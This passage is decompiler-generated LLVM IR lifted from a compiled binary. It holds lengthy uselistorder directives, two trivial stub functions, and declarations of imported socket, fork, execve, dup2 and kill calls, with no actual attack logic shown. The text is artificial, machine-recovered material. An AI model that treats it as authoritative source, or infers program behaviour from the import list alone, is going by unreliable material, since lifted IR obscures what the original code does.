  uselistorder i32 -1, { 170, 0, 1, 36, 272, 171, 39, 40, 37, 38, 172, 41, 42, 43, 44, 45, 169, 173, 174, 175, 2, 176, 177, 3, 4, 178, 179, 5, 57, 58, 6, 259, 180, 46, 47, 82, 313, 273, 83, 260, 149, 7, 261, 84, 8, 9, 85, 241, 10, 11, 12, 91, 89, 86, 242, 136, 137, 90, 88, 87, 150, 243, 262, 181, 182, 79, 48, 13, 92, 274, 183, 184, 275, 276, 93, 263, 14, 94, 49, 50, 185, 186, 187, 95, 264, 188, 64, 96, 16, 17, 152, 59, 60, 151, 265, 66, 65, 61, 62, 189, 138, 139, 190, 191, 15, 266, 277, 192, 80, 51, 193, 278, 18, 52, 194, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 195, 314, 315, 196, 168, 53, 73, 279, 197, 198, 280, 281, 81, 74, 75, 282, 283, 284, 285, 286, 145, 97, 287, 167, 153, 71, 70, 199, 288, 289, 290, 291, 200, 154, 292, 19, 293, 201, 20, 202, 294, 295, 155, 98, 247, 99, 338, 339, 100, 317, 101, 248, 102, 340, 103, 252, 104, 341, 105, 342, 106, 343, 107, 344, 108, 249, 109, 250, 110, 345, 111, 346, 76, 347, 21, 203, 22, 112, 253, 254, 204, 205, 206, 255, 256, 156, 23, 244, 72, 207, 208, 157, 209, 24, 25, 68, 113, 296, 114, 246, 115, 257, 116, 297, 117, 298, 118, 267, 119, 299, 120, 300, 158, 268, 121, 269, 210, 122, 123, 301, 166, 124, 211, 212, 213, 214, 215, 216, 217, 218, 165, 302, 125, 270, 219, 271, 220, 26, 67, 77, 78, 318, 221, 303, 222, 159, 304, 54, 305, 306, 160, 27, 223, 224, 140, 146, 144, 307, 28, 147, 31, 29, 30, 148, 161, 308, 309, 225, 32, 55, 63, 141, 56, 251, 310, 162, 126, 319, 127, 316, 128, 258, 129, 311, 130, 321, 131, 348, 132, 245, 133, 322, 134, 312, 135, 320, 226, 227, 228, 229, 230, 231, 232, 163, 233, 234, 235, 236, 237, 238, 239, 33, 34, 35, 142, 143, 69, 240, 164 }
  uselistorder i32* @global_var_201c8.505, { 1, 0 }
  uselistorder i32 1, { 543, 248, 447, 463, 464, 448, 544, 545, 1037, 1038, 1039, 546, 230, 232, 231, 233, 234, 229, 235, 1040, 265, 1041, 548, 547, 240, 241, 244, 242, 239, 243, 238, 367, 366, 368, 410, 1042, 1043, 163, 1044, 319, 318, 320, 549, 309, 310, 308, 1045, 373, 1046, 374, 1047, 900, 901, 902, 903, 904, 905, 906, 550, 348, 349, 347, 344, 343, 345, 346, 907, 470, 908, 909, 551, 169, 168, 170, 164, 165, 167, 166, 396, 910, 911, 552, 225, 220, 912, 411, 913, 918, 919, 452, 920, 921, 922, 471, 472, 923, 924, 553, 311, 315, 316, 314, 312, 313, 554, 925, 555, 269, 268, 267, 270, 926, 556, 161, 162, 927, 928, 929, 930, 557, 54, 55, 812, 813, 814, 815, 816, 817, 818, 819, 820, 560, 559, 558, 130, 131, 132, 821, 822, 823, 824, 825, 564, 563, 562, 561, 255, 254, 260, 256, 259, 258, 257, 261, 262, 253, 263, 412, 931, 932, 413, 933, 934, 935, 936, 937, 473, 938, 939, 940, 941, 942, 566, 565, 43, 41, 45, 42, 46, 47, 48, 40, 44, 389, 947, 943, 944, 945, 946, 437, 567, 60, 61, 59, 836, 837, 838, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 568, 68, 69, 62, 63, 64, 65, 67, 66, 397, 283, 1115, 1116, 1117, 1118, 1119, 1120, 569, 355, 356, 357, 354, 570, 201, 398, 474, 1048, 571, 128, 126, 125, 129, 127, 1121, 1122, 475, 572, 174, 175, 171, 172, 173, 1049, 1050, 574, 573, 334, 335, 337, 336, 338, 575, 100, 576, 476, 477, 577, 112, 964, 414, 963, 399, 379, 967, 415, 965, 0, 970, 971, 972, 973, 580, 579, 578, 218, 219, 974, 975, 976, 977, 978, 453, 979, 980, 454, 982, 478, 983, 449, 450, 457, 1, 455, 456, 984, 981, 479, 985, 443, 587, 586, 529, 585, 584, 530, 583, 582, 581, 390, 440, 986, 987, 988, 989, 990, 416, 588, 118, 839, 840, 841, 589, 360, 361, 359, 358, 1051, 400, 1052, 1178, 401, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 531, 591, 590, 18, 19, 13, 16, 14, 17, 12, 15, 20, 21, 480, 1123, 1124, 1125, 1126, 1127, 1128, 592, 532, 53, 51, 52, 404, 417, 1053, 481, 1054, 1055, 482, 387, 418, 384, 402, 403, 1056, 483, 1057, 1058, 1059, 1060, 419, 1061, 375, 1062, 1063, 484, 1064, 1065, 1066, 606, 605, 604, 603, 602, 601, 600, 599, 598, 597, 596, 595, 594, 533, 593, 26, 25, 38, 30, 28, 27, 34, 31, 33, 39, 32, 29, 37, 35, 36, 1067, 1068, 534, 607, 291, 289, 294, 296, 292, 293, 288, 290, 295, 1069, 1070, 1071, 1072, 385, 1073, 1074, 1075, 608, 186, 187, 184, 188, 185, 1076, 1077, 609, 264, 1129, 1130, 1131, 1132, 1133, 111, 110, 106, 109, 105, 104, 107, 108, 610, 272, 1078, 612, 611, 101, 102, 103, 420, 458, 615, 614, 613, 616, 363, 617, 193, 194, 618, 142, 143, 619, 273, 133, 620, 70, 621, 321, 622, 266, 623, 322, 624, 342, 625, 364, 626, 224, 627, 305, 350, 228, 2, 631, 630, 629, 628, 24, 23, 485, 632, 421, 486, 633, 200, 634, 878, 639, 638, 637, 636, 635, 202, 203, 205, 206, 204, 867, 868, 642, 641, 640, 306, 307, 643, 391, 885, 386, 886, 422, 644, 177, 182, 176, 179, 178, 181, 183, 180, 392, 826, 645, 113, 115, 116, 114, 117, 879, 423, 880, 424, 881, 647, 646, 85, 86, 84, 87, 88, 648, 93, 89, 95, 91, 90, 92, 94, 649, 651, 650, 1191, 425, 654, 653, 652, 331, 330, 655, 285, 286, 284, 287, 195, 196, 197, 656, 299, 300, 298, 297, 657, 658, 351, 352, 426, 1134, 659, 249, 250, 660, 227, 661, 160, 662, 78, 663, 76, 664, 208, 665, 77, 666, 22, 667, 251, 487, 991, 388, 992, 993, 488, 1012, 671, 670, 669, 668, 144, 146, 147, 145, 672, 673, 888, 889, 3, 890, 427, 891, 252, 675, 674, 328, 329, 1192, 676, 966, 677, 914, 915, 916, 917, 1079, 1080, 678, 317, 405, 1081, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 212, 210, 211, 213, 214, 1013, 1014, 4, 1015, 5, 6, 7, 428, 1016, 1017, 8, 49, 50, 1018, 380, 192, 191, 1173, 1174, 969, 968, 827, 828, 829, 830, 831, 832, 833, 1196, 98, 99, 96, 97, 1082, 141, 140, 489, 679, 490, 1019, 1020, 1021, 1022, 680, 535, 136, 137, 134, 138, 135, 1138, 1135, 1136, 1137, 381, 406, 72, 75, 71, 73, 74, 1139, 1140, 1141, 1142, 1143, 1144, 681, 122, 119, 124, 121, 120, 123, 429, 1145, 1146, 491, 1147, 683, 682, 245, 246, 247, 685, 684, 226, 1023, 1024, 687, 686, 56, 57, 58, 689, 688, 237, 236, 869, 691, 690, 11, 10, 444, 1083, 493, 1084, 1085, 430, 431, 1086, 1087, 494, 1088, 1090, 1091, 1092, 495, 1094, 432, 1095, 1093, 492, 1096, 496, 1097, 445, 1098, 1099, 1089, 695, 694, 693, 692, 148, 154, 151, 155, 150, 149, 156, 157, 152, 153, 1100, 696, 323, 325, 324, 327, 326, 697, 217, 216, 1101, 1102, 1103, 698, 158, 159, 446, 393, 1105, 394, 1106, 433, 1107, 1108, 1110, 382, 1111, 497, 1112, 395, 1109, 436, 706, 705, 704, 703, 702, 701, 700, 699, 80, 83, 81, 82, 498, 407, 707, 301, 302, 303, 1104, 459, 536, 708, 362, 499, 834, 835, 709, 340, 339, 341, 1193, 460, 1194, 1195, 710, 333, 332, 79, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 408, 1162, 713, 712, 711, 276, 275, 274, 278, 277, 500, 441, 442, 870, 716, 715, 714, 279, 281, 280, 282, 718, 717, 209, 720, 719, 721, 1163, 1164, 1165, 1166, 1167, 724, 723, 722, 189, 190, 871, 725, 198, 726, 139, 727, 215, 728, 271, 199, 729, 369, 730, 353, 731, 732, 365, 733, 207, 461, 1168, 1169, 462, 1175, 1176, 842, 843, 844, 845, 846, 847, 504, 848, 849, 378, 502, 503, 850, 505, 851, 506, 852, 501, 853, 854, 741, 740, 739, 738, 737, 736, 735, 734, 510, 507, 508, 509, 511, 512, 745, 744, 743, 742, 855, 856, 537, 746, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 747, 539, 538, 748, 749, 882, 513, 514, 515, 756, 540, 755, 754, 753, 752, 751, 750, 883, 884, 516, 517, 765, 764, 763, 541, 762, 761, 760, 759, 758, 757, 887, 409, 451, 518, 519, 770, 769, 768, 767, 766, 223, 221, 222, 772, 771, 465, 892, 376, 377, 893, 894, 895, 776, 775, 774, 773, 896, 777, 897, 778, 898, 780, 779, 781, 899, 782, 1025, 1026, 520, 1027, 1028, 1029, 521, 383, 1030, 522, 1031, 523, 789, 788, 787, 786, 785, 784, 783, 304, 1032, 524, 1033, 438, 790, 434, 1034, 791, 525, 1113, 526, 1114, 527, 528, 800, 799, 798, 797, 796, 795, 794, 793, 792, 1170, 1171, 1172, 801, 803, 802, 439, 1177, 435, 1035, 9, 1036, 805, 804, 808, 807, 806, 467, 872, 873, 466, 874, 875, 468, 469, 876, 877, 809, 810, 811, 372, 371, 370, 542 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_15c4c() local_unnamed_addr {
dec_label_pc_15c4c:
  %v5_15c50 = load i32, i32* @r0, align 4
  ret i32 %v5_15c50

; uselistorder directives
  uselistorder i32* @r0, { 10, 17, 18, 66, 67, 68, 69, 70, 71, 72, 209, 39, 210, 211, 9, 212, 213, 214, 215, 28, 73, 216, 217, 218, 219, 43, 153, 154, 155, 156, 157, 160, 158, 159, 30, 74, 75, 76, 77, 78, 79, 80, 161, 162, 7, 265, 266, 220, 221, 222, 123, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 88, 89, 90, 91, 23, 34, 267, 42, 223, 224, 225, 55, 56, 226, 57, 58, 227, 228, 229, 59, 230, 231, 232, 233, 234, 235, 236, 237, 38, 238, 239, 240, 45, 49, 25, 306, 307, 308, 50, 309, 24, 51, 52, 310, 311, 62, 63, 64, 65, 21, 8, 13, 14, 53, 312, 313, 143, 37, 81, 82, 83, 20, 135, 136, 137, 138, 139, 140, 141, 303, 304, 15, 11, 269, 31, 268, 92, 54, 93, 26, 270, 192, 193, 194, 195, 196, 197, 198, 199, 36, 12, 29, 241, 242, 243, 244, 299, 33, 60, 245, 41, 200, 201, 272, 273, 274, 275, 276, 277, 27, 278, 279, 280, 281, 94, 202, 203, 282, 124, 246, 247, 248, 3, 22, 249, 250, 4, 6, 0, 1, 251, 252, 5, 253, 254, 255, 32, 256, 257, 258, 2, 259, 260, 84, 271, 85, 86, 87, 314, 315, 283, 284, 285, 286, 287, 288, 289, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 261, 262, 35, 290, 291, 292, 293, 294, 295, 95, 46, 296, 40, 305, 44, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 142, 144, 145, 146, 147, 148, 149, 150, 151, 152, 204, 205, 206, 207, 297, 298, 300, 302, 301, 208, 263, 264, 19, 16, 47, 48, 61 }
}

define i32 @function_15c54() local_unnamed_addr {
entry:
  %v3_15c58 = load i32, i32* @r4, align 4
  %v0_15c60 = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_15c58)
  ret i32 %v0_15c60

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 19, 2, 3, 4, 5, 6, 11, 12, 13, 14, 24, 25, 21, 22, 23, 7, 26, 15, 8, 16, 10, 17, 18, 9, 1, 20 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 52, 610, 318, 10, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 53, 54, 335, 55, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 202, 5, 203, 204, 4, 205, 206, 207, 12, 208, 11, 209, 210, 211, 494, 495, 212, 215, 218, 219, 220, 221, 222, 213, 214, 216, 217, 13, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 238, 237, 239, 240, 241, 242, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 14, 16, 69, 15, 70, 71, 72, 73, 243, 244, 245, 246, 2, 247, 248, 249, 250, 251, 252, 253, 256, 254, 255, 44, 257, 258, 356, 357, 358, 496, 497, 17, 498, 499, 500, 501, 502, 503, 18, 504, 505, 506, 507, 508, 509, 510, 359, 360, 511, 512, 513, 514, 515, 516, 517, 518, 519, 361, 362, 363, 364, 259, 260, 142, 143, 614, 615, 618, 619, 261, 263, 262, 265, 264, 7, 270, 266, 271, 6, 272, 273, 274, 275, 276, 277, 19, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 99, 100, 101, 102, 103, 104, 365, 366, 367, 368, 369, 370, 371, 620, 621, 372, 373, 374, 375, 376, 377, 378, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 520, 521, 522, 523, 524, 525, 526, 20, 527, 528, 74, 379, 380, 21, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 22, 393, 394, 395, 396, 23, 397, 398, 399, 24, 400, 401, 402, 403, 404, 405, 8, 406, 0, 407, 408, 25, 529, 530, 531, 534, 535, 144, 145, 146, 147, 148, 409, 1, 149, 150, 638, 639, 9, 536, 537, 151, 152, 171, 640, 641, 642, 643, 644, 645, 153, 154, 155, 646, 647, 26, 648, 649, 650, 651, 663, 664, 665, 666, 48, 674, 45, 658, 659, 660, 661, 662, 652, 653, 654, 172, 173, 174, 175, 176, 177, 178, 179, 655, 656, 190, 191, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 180, 181, 182, 183, 184, 605, 606, 185, 186, 187, 607, 608, 609, 657, 538, 539, 540, 27, 105, 106, 107, 28, 108, 29, 109, 110, 541, 30, 31, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 410, 411, 134, 135, 192, 193, 412, 413, 414, 415, 290, 291, 416, 417, 418, 419, 292, 293, 294, 295, 296, 32, 297, 298, 299, 300, 301, 302, 667, 668, 669, 267, 268, 269, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 303, 304, 305, 306, 33, 307, 308, 309, 555, 556, 557, 558, 559, 560, 561, 562, 563, 566, 567, 568, 569, 111, 34, 112, 113, 310, 311, 312, 313, 314, 570, 35, 571, 572, 156, 157, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 454, 453, 455, 456, 457, 458, 459, 460, 461, 36, 462, 463, 464, 470, 471, 472, 473, 3, 474, 475, 476, 477, 478, 479, 480, 37, 481, 38, 482, 483, 484, 485, 86, 87, 88, 465, 467, 466, 468, 469, 564, 565, 89, 49, 90, 91, 92, 93, 94, 95, 96, 97, 46, 98, 670, 671, 672, 673, 573, 574, 575, 576, 577, 578, 579, 39, 580, 40, 581, 582, 583, 584, 585, 586, 587, 50, 158, 47, 159, 160, 161, 162, 163, 164, 165, 166, 486, 487, 488, 489, 588, 589, 590, 591, 592, 593, 594, 41, 42, 597, 598, 532, 533, 194, 195, 490, 491, 612, 613, 114, 115, 616, 617, 116, 117, 118, 43, 119, 120, 121, 122, 492, 493, 595, 596, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 136, 137, 138, 139, 140, 141, 188, 189, 196, 197, 198, 199, 200, 201, 315, 316, 317, 599, 600, 601, 602, 603, 604, 167, 168, 169, 170, 51, 611 }
}

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i8* @getcwd(i8*, i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
